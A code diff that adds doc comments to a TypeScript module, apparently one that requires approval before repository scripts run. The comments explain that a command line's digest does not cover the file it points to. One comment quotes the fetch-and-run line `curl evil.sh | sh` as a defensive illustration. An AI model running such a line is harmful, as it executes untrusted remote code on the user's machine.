@@ -61,10 +61,20 @@ export interface ResolvedScript {
   readonly from: string
   readonly run: ScriptRun
   /**
-   * The text that is shown before it is approved.
+   * The text that is shown before it is approved, and what is digested.
    *
-   * The file's body, or the command line. Whatever is shown is what runs: an
-   * approval over a summary is an approval of the summary.
+   * The file's body, or the command line — and the difference matters, because
+   * only the first is what runs. A file's contents *are* the program, so
+   * showing every byte of them is an approval of the program. A command line is
+   * a pointer: `./scripts/boot.sh` is four characters over a file this never
+   * touches, so a `git pull` rewriting that file leaves the digest identical
+   * and the approval standing.
+   *
+   * Not fixable by following the line. `repoTrust.ts` settled the rule for
+   * hooks — do not resolve a path out of a shell line, because
+   * `curl evil.sh | sh` names no file — and there is no directory to digest
+   * whole here, so what is left is to claim no more than the digest holds. The
+   * card says so where the approval is given.
    */
   readonly contents: string
 }
@@ -168,6 +178,10 @@ export async function resolveScripts(
 
 /**
  * What has to be approved before any of these may run, or `''` for nothing.
+ *
+ * **Exact for a file, a pointer for a command line.** See `contents` above: a
+ * `.conductor` script is a line, so this digests the line and not the shell it
+ * invokes. The pane says as much when one is being approved.
  *
  * **Only what the repository supplies.** A script the user wrote in Project
  * settings is not gated: they wrote it, and asking somebody to approve their own
